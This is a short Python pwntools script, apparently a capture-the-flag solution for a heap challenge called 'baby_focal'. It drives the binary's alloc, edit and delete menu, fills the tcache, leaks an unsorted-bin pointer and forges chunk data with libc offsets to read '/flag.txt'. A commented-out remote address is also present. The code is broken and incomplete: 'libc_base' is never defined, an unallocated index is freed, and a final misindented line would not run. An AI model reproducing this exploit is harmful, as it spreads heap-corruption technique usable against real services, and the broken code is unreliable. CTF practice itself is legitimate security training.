baby_focal

from pwn import *

#context.log_level = 'debug'

#p = remote('115.28.187.226','32435')
p = process('./baby_focal')
elf = ELF('./baby_focal')
libc = elf.libc

def alloc(idx,size):
    p.sendlineafter('>> ',str(1))
    p.sendlineafter('index >> ',str(idx))
    p.sendlineafter('size >> ',str(size))
    p.recvuntil('alloc: [')
    return int(p.recvline()[:-2],16)

def edit(idx,con):
    p.sendlineafter('>> ',str(2))
    p.sendlineafter('index >> ',str(idx))
    p.sendlineafter('content >> ',con)

def delet(idx):
    p.sendlineafter('>> ',str(3))
    p.sendlineafter('index >> ',str(idx))

p.sendlineafter('input your name: ','/flag.txt')

for i in range(7):
    alloc(0,0x68)
    delet(0)
un_ptr = alloc(0,0x410)
un_ptr+= 0x2b0+0xf0
p.info('un_ptr: '+hex(un_ptr))

delet(0)

alloc(2,0x68)

alloc(4,0x68)

delet(0)

delet(3)

alloc(0,0x68)
edit(0,p64(libc_base+0x1ebbe0)*2+b'\x00'*0x50+p64(0x70))

    alloc(1,0x77)
